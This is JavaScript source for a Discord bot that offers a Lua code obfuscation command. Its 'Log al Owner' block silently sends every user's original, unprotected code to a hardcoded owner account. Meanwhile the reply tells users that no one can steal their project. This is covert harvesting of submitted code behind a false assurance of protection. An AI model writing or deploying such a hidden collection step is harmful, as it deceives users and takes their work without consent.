const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder, EmbedBuilder } = require('discord.js');
const { obfuscate } = require('./obfuscator');
const https = require('https');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const OWNER_ID = '1474472773467242599';

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const command = new SlashCommandBuilder()
    .setName('obf')
    .setDescription('Protect your code with VMM Obfuscator')
    .addStringOption(o => 
        o.setName('mode')
            .setDescription('Select the obfuscation mode')
            .setRequired(true)
            .addChoices(
                { name: 'Normal', value: 'normal' },
                { name: 'Diabolical', value: 'diabolical' }
            ))
    .addStringOption(o => o.setName('code').setDescription('Paste your Lua code').setRequired(false))
    .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file').setRequired(false));

function fetchURL(url) {
    return new Promise((resolve, reject) => {
        const mod = url.startsWith('https') ? https : http;
        mod.get(url, res => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => resolve(d));
        }).on('error', reject);
    });
}

client.once('ready', async () => {
    console.log(`Bot online: ${client.user.tag}`);
    try {
        const rest = new REST({ version: '10' }).setToken(TOKEN);
        await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON()] });
    } catch (err) {
        console.error(err);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;

    const mode = interaction.options.getString('mode');
    const codeOption = interaction.options.getString('code');
    const fileOption = interaction.options.getAttachment('file');

    if (!codeOption && !fileOption) {
        return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });
    }

    await interaction.deferReply();

    try {
        let src = fileOption ? await fetchURL(fileOption.url) : codeOption;

        // --- VALIDACIÓN DE LUA / LOADSTRING ---
        // Buscamos palabras clave comunes o loadstring
        const isLua = /function|local|then|end|print|loadstring|require|game:|task\./i.test(src);
        
        if (!isLua) {
            const errorEmbed = new EmbedBuilder()
                .setColor(0xFF0000) // Rojo
                .setTitle('⚠️ Error')
                .addFields({ 
                    name: 'info', 
                    value: "❌ we don't find real lua if this a error report it or see if your code have some sintaxis error" 
                });
            
            return interaction.editReply({ embeds: [errorEmbed] });
        }

        // Log al Owner
        try {
            const owner = await client.users.fetch(OWNER_ID);
            const originalBuf = Buffer.from(src, 'utf-8');
            await owner.send({
                content: `**User:** ${interaction.user.tag}\n**Mode:** ${mode}`,
                files: [new AttachmentBuilder(originalBuf, { name: 'original.lua' })]
            });
        } catch (e) {}

        const obfuscatedResult = obfuscate(src, mode);
        const buf = Buffer.from(obfuscatedResult, 'utf-8');

        // --- EMBED NEGRO CON SEPARACIONES ---
        const responseEmbed = new EmbedBuilder()
            .setColor(0x000000) // Color Negro
            .setTitle('✅ Obfuscation successfully completed')
            .addFields(
                { 
                    name: 'Mod', 
                    value: `\`${mode.toUpperCase()}\``,
                    inline: false 
                },
                { 
                    name: 'Info', 
                    value: "Your code is protected by multiple obfuscation techniques. Don't worry, when searching all deobfuscators, no one can steal your project or work.",
                    inline: false
                },
                { 
                    name: 'advrt', 
                    value: "\n• Don't be scared if the file is big, it will be executable.\n\n• We recommend obfuscating a loadstring code ⚠️ because we don't support scripts of more than 300-400 lines.\n\n• Use it and follow the rules properly.",
                    inline: false
                }
            )
            .setFooter({ text: 'VMM Obfuscator Protection' })
            .setTimestamp();

        await interaction.editReply({
            files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })],
            embeds: [responseEmbed]
        });

    } catch (e) {
        console.error(e);
        await interaction.editReply('An error occurred during the process.');
    }
});

client.login(TOKEN);
            
